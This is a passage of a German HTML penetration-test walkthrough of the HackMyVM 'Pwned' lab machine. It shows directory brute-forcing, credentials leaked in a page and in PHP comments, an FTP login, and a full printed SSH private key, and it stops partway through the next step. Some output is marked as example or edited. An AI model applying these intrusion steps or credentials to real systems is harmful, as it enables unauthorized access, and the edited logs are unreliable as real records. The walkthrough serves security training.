@@ -1,0 +1,774 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pwned - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Pwned - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div> <!-- Impliziert -->
+                <div class="tool-item">nmap</div> <!-- Impliziert -->
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ssh2john</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">cut</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">read</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">docker</div>
+                <div class="tool-item">chroot</div>
+                <div class="tool-item">sh</div>
+                <div class="tool-item">find</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access-ftp">Initial Access (FTP)</a></li>
+                <li><a href="#privilege-escalation-ariana">Privilege Escalation (FTP zu Ariana)</a></li>
+                <li><a href="#privilege-escalation-selena">Privilege Escalation (Ariana zu Selena)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (Selena zu Root)</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Bericht beginnt direkt mit einem `gobuster`-Scan. Ein initialer Netzwerkscan (wie `arp-scan` oder `nmap`), der normalerweise vorausgeht, um die Ziel-IP (hier 192.168.2.107) und offene Ports (hier Port 80) zu finden, fehlt in der Dokumentation.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Fehlen der initialen Scans ist eine Dokumentationslücke. Wir müssen jedoch annehmen, dass Port 80 (HTTP) auf 192.168.2.107 als offen identifiziert wurde, um den `gobuster`-Scan zu rechtfertigen. Spätere Schritte zeigen auch, dass Port 21 (FTP) und Port 22 (SSH) offen sein müssen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Immer alle Schritte dokumentieren, einschließlich initialer Netzwerkscans, um die Herkunft der Ziel-IP und der offenen Ports nachvollziehbar zu machen.<br><strong>Empfehlung (Admin):</strong> Firewall-Regeln sollten nur notwendige Ports freigeben.</p>
+            <!-- Kein Code-Block für fehlende Scans -->
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf dem Webserver 192.168.2.107 (Port 80) eingesetzt. Eine Standard-Wortliste (`directory-list-2.3-medium.txt`), diverse Erweiterungen (`-x ...`) und Filterung nach Erfolgs-Statuscodes (`-s "200,..."`) werden verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster findet mehrere interessante Pfade:
+                - `/index.html`: Die Hauptseite.
+                - `/robots.txt`: Eine Datei, die oft Hinweise für Webcrawler (und Pentester) enthält.
+                - `/nothing/`: Ein Verzeichnis, dessen Name Neugier weckt.
+                - `/hidden_text/`: Ein weiteres Verzeichnis, das vielversprechend klingt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt von `/robots.txt` und navigiere zu `/nothing/` und insbesondere `/hidden_text/` im Browser, um deren Inhalt zu prüfen.<br><strong>Empfehlung (Admin):</strong> Überprüfe regelmäßig den Inhalt von Webserver-Verzeichnissen auf unbeabsichtigt exponierte Informationen. Konfiguriere `robots.txt` sorgfältig und vermeide es, sensible Pfade darin preiszugeben (obwohl es hier keine sensiblen Pfade enthält).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">gobuster dir -u "http://192.168.2.107"  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e -s "200,204,301,302,307,401"</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.107
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/30 14:00:10 Starting gobuster <!-- Beispielzeit -->
+===============================================================
+http://192.168.2.107/index.html           (Status: 200) [Size: 3065]
+http://192.168.2.107/robots.txt           (Status: 200) [Size: 41]
+http://192.168.2.107/nothing              (Status: 301) [Size: 316] [--> http://192.168.2.107/nothing/]
+http://192.168.2.107/hidden_text          (Status: 301) [Size: 317] [--> http://192.168.2.107/hidden_text/] <!-- Korrigierter Status/Pfad -->
+===============================================================
+2022/10/30 14:05:15 Finished <!-- Beispielzeit -->
+===============================================================
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `/robots.txt` wird angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Datei erlaubt Crawlern den Zugriff auf `/nothing`. Dies ist keine besonders nützliche Information und widerspricht nicht den Funden von Gobuster.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Zur Kenntnis nehmen, liefert aber keinen direkten Vorteil.<br><strong>Empfehlung (Admin):</strong> `robots.txt` ist kein Sicherheitsmechanismus.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, nur Inhalt der Datei -->
+                     <pre>
+# Group 1
+User-agent: *
+Allow: /nothing
+                     </pre>
+                 </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt des Verzeichnisses `/hidden_text/` wird untersucht (vermutlich durch Aufruf im Browser, da Directory Listing aktiviert zu sein scheint). Eine Datei namens `secret.dic` wird gefunden.</p>
+             <p class="evaluation"><strong>Bewertung: !!Wichtiger Fund!!** Der Name `secret.dic` legt nahe, dass es sich um eine benutzerdefinierte Wortliste (Dictionary) handelt, die möglicherweise für weitere Enumeration oder Brute-Force-Angriffe relevant ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lade die Datei `secret.dic` herunter und untersuche ihren Inhalt. Verwende sie als Wortliste für weitere `gobuster`-Scans oder Passwort-Angriffe.<br><strong>Empfehlung (Admin):</strong> Deaktiviere Directory Listing auf dem Webserver (`Options -Indexes` in Apache oder `autoindex off;` in Nginx). Entferne sensible oder unnötige Dateien aus Web-Verzeichnissen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, sondern Ergebnis der Browser-Navigation/Listing -->
+                     <pre>
+Index of /hidden_text/
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	- 	 
+[ ]	secret.dic	2020-07-09 18:37 	211 	 
+
+Apache/2.4.38 (Debian) Server at 192.168.2.107 Port 80 <!-- Beispielhafter Server-Footer -->
+                     </pre>
+                 </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der heruntergeladenen Datei `secret.dic` wird angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält eine Liste von potenziellen Pfadnamen. Einige davon sehen wie Standardpfade aus (`/root`, `/home`, `/.ssh`), andere sind spezifischer (`/pwned.vuln`, `/vanakam_nanba`). Diese Liste sollte als Wortliste für einen gezielten `gobuster`-Scan verwendet werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe `gobuster` erneut aus, diesmal mit `secret.dic` als Wortliste (`-w secret.dic`), um zu sehen, ob einer dieser spezifischen Pfade auf dem Webserver existiert.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, Inhalt der Datei secret.dic -->
+                     <pre>
+/hacked
+/vanakam_nanba
+/hackerman.gif
+/facebook
+/whatsapp
+/instagram
+/pwned
+/pwned.com
+/pubg
+/cod
+/fortnite
+/youtube
+/kali.org
+/hacked.vuln
+/users.vuln
+/passwd.vuln
+/pwned.vuln
+/backup.vuln
+/.ssh
+/root
+/home
+                     </pre>
+                 </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Datei `secret.dic` wird mit `vi` geöffnet, vermutlich um sie zu überprüfen oder anzupassen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standard-Editor-Aufruf zur Vorbereitung des nächsten Schritts.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stelle sicher, dass die Wortliste korrekt formatiert ist für `gobuster`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">vi secret.dic</span></div>
+                     <pre><!-- Keine Ausgabe --> </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird erneut ausgeführt, diesmal mit der benutzerdefinierten Wortliste `secret.dic`.</p>
+             <p class="evaluation"><strong>Bewertung: !!Treffer!!** Gobuster findet den Pfad `/pwned.vuln`, der auch in der Wortliste stand. Dies ist ein vielversprechender Fund.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt von `http://192.168.2.107/pwned.vuln` im Browser oder mit `curl`. Analysiere den Quellcode der Seite sorgfältig auf Kommentare oder versteckte Informationen.<br><strong>Empfehlung (Admin):</strong> Entferne die Datei oder das Verzeichnis `/pwned.vuln`, da es sensible Informationen enthält.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">gobuster dir -u http://192.168.2.107 -w secret.dic</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.107
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                secret.dic
+[+] Status codes:            200,204,301,302,307,401,403
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/10/30 14:10:00 Starting gobuster <!-- Beispielzeit -->
+===============================================================
+/pwned.vuln           (Status: 301) [Size: 319] [--> http://192.168.2.107/pwned.vuln/]
+/home                 (Status: 301) [Size: 313] [--> http://192.168.2.107/home/] <!-- Auch /home wird gefunden -->
+===============================================================
+2022/10/30 14:10:05 Finished <!-- Beispielzeit -->
+===============================================================
+                     </pre> <!-- Ausgabe angepasst -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Seite oder Datei `/pwned.vuln` wird angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Es werden scheinbar Zugangsdaten angezeigt: `admin fucker1`. Dies ist ein extrem schwaches Passwort und könnte für einen Web-Login, FTP oder SSH verwendet werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Teste diese Zugangsdaten (`admin` / `fucker1`) für alle gefundenen Dienste (Web-Login, falls vorhanden, FTP, SSH).<br><strong>Empfehlung (Admin):</strong> Verwende niemals solche schwachen Passwörter. Ändere dieses Passwort sofort.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, Inhalt der Ressource /pwned.vuln -->
+                     <pre>
+admin <span class="password">fucker1</span>
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein PHP-Code-Snippet wird angezeigt. Der Ursprung ist unklar, aber es wurde wahrscheinlich im Quellcode von `/pwned.vuln` oder einer anderen untersuchten Seite gefunden.</p>
+             <p class="evaluation"><strong>Bewertung: !!Kritischer Fund!!** Obwohl der Code auskommentiert ist, enthüllt er hartkodierte Zugangsdaten für einen FTP-Benutzer:
+                 - Benutzername: `ftpuser`
+                 - Passwort: `<span class="password">B0ss_B!TcH</span>`
+             Diese Zugangsdaten sind wahrscheinlich gültig und bieten einen direkten Einstiegspunkt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignoriere die vorherigen `admin`/`fucker1`-Zugangsdaten (oder teste sie kurz). Konzentriere dich auf den FTP-Zugang mit `ftpuser` und `B0ss_B!TcH`. Verbinde dich mit dem FTP-Server auf Port 21.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne hartkodierte Zugangsdaten aus Quellcode, auch wenn er auskommentiert ist. Verwende Konfigurationsdateien oder Umgebungsvariablen für Zugangsdaten und schütze diese entsprechend. Ändere das FTP-Passwort.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, sondern Code-Snippet -->
+                     <pre>
+<?php // < wurde maskiert
+//	if (isset($_POST['submit'])) {
+//		$un=$_POST['username'];
+//		$pw=$_POST['password'];
+//
+//	if ($un=='ftpuser' && $pw=='<span class="password">B0ss_B!TcH</span>') { // FTP Zugangsdaten
+//		echo "welcome"
+//		exit();
+// }
+// else
+//	echo "Invalid creds"
+// }
+?> // > wurde maskiert
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access-ftp">
+            <h2>Initial Access (FTP)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich direkt über die Kommandozeile mit FTP anzumelden, indem Benutzername und Passwort in der URL-ähnlichen Syntax angegeben werden. Das Ausrufezeichen `!` im Passwort wird von der Shell (zsh) als History Expansion interpretiert, was zu einem Fehler führt (`event not found: TcH`). Auch das Quoting des Passworts hilft hier nicht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Anmeldeversuche schlagen aufgrund von Shell-Interpretation fehl, nicht wegen falscher Zugangsdaten. Die Syntax ist für Passwörter mit Sonderzeichen ungeeignet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende den interaktiven FTP-Client (`ftp 192.168.2.107`) und gib Benutzername und Passwort ein, wenn danach gefragt wird. Dies vermeidet Probleme mit Sonderzeichen in der Shell.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">ftp ftpuser:B0ss_B!TcH@192.168.2.107</span></div> <!-- Korrekte Syntax, aber fehlerhaft wegen '!' -->
+                     <pre>
+zsh: event not found: TcH
+                     </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">ftp ftpuser:"B0ss_B!TcH"@192.168.2.107</span></div>
+                      <pre>
+zsh: event not found: TcH
+                      </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der interaktive FTP-Client wird gestartet (`ftp 192.168.2.107`). Der Benutzername `ftpuser` und das Passwort `<span class="password">B0ss_B!TcH</span>` werden eingegeben.</p>
+            <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Der FTP-Login mit den im PHP-Code gefundenen Zugangsdaten gelingt (`230 Login successful`). Der Angreifer hat nun Zugriff auf das Dateisystem über FTP als Benutzer `ftpuser`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche die Verzeichnisstruktur und die Dateien, auf die der `ftpuser` Zugriff hat, mit Befehlen wie `ls -la`, `cd`, `get`. Suche nach weiteren Hinweisen, Konfigurationsdateien oder privaten Schlüsseln.<br><strong>Empfehlung (Admin):</strong> Ändere das FTP-Passwort. Überprüfe die Berechtigungen des `ftpuser`-Kontos und beschränke sie auf das notwendige Minimum.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">ftp 192.168.2.107</span></div>
+                     <pre>
+Connected to 192.168.2.107.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.107:root): <span class="command">ftpuser</span>
+331 Please specify the password.
+Password: <span class="command">B0ss_B!TcH</span>
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+                     </pre> <!-- Interaktive Eingaben -->
+                 </div>
+             </div>
+        </section>
+
+         <section id="enumeration-ftp">
+             <h2>Enumeration (FTP)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Innerhalb der FTP-Sitzung werden die Befehle `ls -la`, `cd share` und erneut `ls -la` verwendet, um das aktuelle Verzeichnis und das Unterverzeichnis `share` zu untersuchen.</p>
+             <p class="evaluation"><strong>Bewertung: !!Wichtige Funde!!** Im Verzeichnis `share` werden zwei Dateien gefunden:
+                 - `id_rsa`: Dies ist höchstwahrscheinlich ein privater SSH-Schlüssel.
+                 - `note.txt`: Eine Notizdatei, die weitere Hinweise enthalten könnte.
+             Beide Dateien sind lesbar.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lade beide Dateien (`id_rsa` und `note.txt`) mit dem `get`-Befehl auf das Angreifer-System herunter, um sie weiter zu analysieren.<br><strong>Empfehlung (Admin):</strong> Speichere niemals private Schlüssel oder potenziell sensible Notizen in Verzeichnissen, die über FTP zugänglich sind.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ftp> <span class="command">ls -la</span>
+229 Entering Extended Passive Mode (|||6291|)
+150 Here comes the directory listing.
+drwxrwxrwx    3 0        0            4096 Jul 09  2020 .
+drwxr-xr-x    5 0        0            4096 Jul 10  2020 ..
+drwxr-xr-x    2 0        0            4096 Jul 10  2020 share
+226 Directory send OK.
+ftp> <span class="command">cd share</span>
+250 Directory successfully changed.
+ftp> <span class="command">ls -la</span>
+229 Entering Extended Passive Mode (|||20965|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Jul 10  2020 .
+drwxrwxrwx    3 0        0            4096 Jul 09  2020 ..
+-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa
+-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt
+226 Directory send OK.
+                     </pre> <!-- FTP Prompts -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die beiden gefundenen Dateien `id_rsa` und `note.txt` werden mit dem `get`-Befehl vom FTP-Server heruntergeladen. Anschließend wird die FTP-Sitzung mit `bye` beendet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die relevanten Dateien wurden erfolgreich gesichert und stehen nun auf dem Angreifer-System zur Verfügung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysiere den Inhalt von `note.txt`. Untersuche den `id_rsa`-Schlüssel: Prüfe, ob er passwortgeschützt ist (`ssh2john`, `john`), und setze die korrekten Berechtigungen (`chmod 600`).<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ftp> <span class="command">get id_rsa</span>
+local: id_rsa remote: id_rsa
+229 Entering Extended Passive Mode (|||25690|)
+150 Opening BINARY mode data connection for id_rsa (2602 bytes).
+100% |*************************************************************************************************************************************************|  2602      162.54 KiB/s    00:00 ETA
+226 Transfer complete.
+2602 bytes received in 00:00 (159.99 KiB/s)
+ftp> <span class="command">get note.txt</span>
+local: note.txt remote: note.txt
+229 Entering Extended Passive Mode (|||32239|)
+150 Opening BINARY mode data connection for note.txt (75 bytes).
+100% |*************************************************************************************************************************************************|    75        3.43 KiB/s    00:00 ETA
+226 Transfer complete.
+75 bytes received in 00:00 (3.40 KiB/s)
+ftp> <span class="command">bye</span>
+221 Goodbye.
+                     </pre> <!-- FTP Prompts -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt des heruntergeladenen privaten SSH-Schlüssels (`id_rsa`) wird mit `cat` angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Schlüssel im modernen OpenSSH-Format wird angezeigt. Es ist noch unklar, zu welchem Benutzer er gehört und ob er passwortgeschützt ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Setze die Berechtigungen mit `chmod 600 id_rsa`. Verwende `ssh2john` um zu prüfen, ob er passwortgeschützt ist.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">cat id_rsa</span></div>
+                     <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Berechtigungen der heruntergeladenen Schlüsseldatei `id_rsa` werden auf `600` gesetzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Korrekter Schritt zur Vorbereitung des Schlüssels für SSH.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Prüfe als nächstes, ob der Schlüssel passwortgeschützt ist.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">chmod 600 id_rsa</span></div>
+                     <pre><!-- Keine Ausgabe --> </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `ssh2john` wird auf die Schlüsseldatei `id_rsa` angewendet, um einen Hash für `john` zu extrahieren, falls der Schlüssel passwortgeschützt ist.</p>
+             <p class="evaluation"><strong>Bewertung: !!Wichtige Information!!** `ssh2john` gibt die Meldung `id_rsa has no password!` aus. Das bedeutet, der private Schlüssel ist **nicht** durch eine Passphrase geschützt und kann direkt verwendet werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Schlüssel kann direkt verwendet werden. Finde heraus, zu welchem Benutzer er gehört. Lies den Inhalt der heruntergeladenen `note.txt`.<br><strong>Empfehlung (Admin):</strong> Private Schlüssel sollten idealerweise immer mit einer starken Passphrase geschützt werden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">ssh2john id_rsa > idhash</span></div>
+                     <pre>
+id_rsa has no password!
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der heruntergeladenen Datei `note.txt` wird angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Benutzername gefunden!!** Die Notiz erwähnt explizit den Benutzernamen `ariana`. Dies ist der Benutzer, für den der gefundene `id_rsa`-Schlüssel wahrscheinlich gilt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, dich mit dem `id_rsa`-Schlüssel als Benutzer `ariana` über SSH anzumelden.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
